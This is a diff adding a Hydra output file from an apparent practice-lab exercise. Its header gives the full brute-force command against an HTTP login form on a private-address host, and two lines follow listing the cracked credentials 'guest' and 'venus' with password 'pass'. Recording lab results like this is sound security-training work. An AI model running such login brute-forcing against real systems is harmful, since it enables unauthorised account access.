@@ -1,0 +1,3 @@
+# Hydra v9.5 run at 2024-08-06 09:26:50 on 10.0.2.15 http-post-form (hydra -L /usr/share/wordlists/metasploit/namelist.txt -p pass -V -s 8080 -t 20 -o users.txt 10.0.2.15 http-post-form /:username=^USER^&password=^PASS^&Login=Login:Invalid username.)
+[8080][http-post-form] host: 10.0.2.15   login: guest   password: pass
+[8080][http-post-form] host: 10.0.2.15   login: venus   password: pass
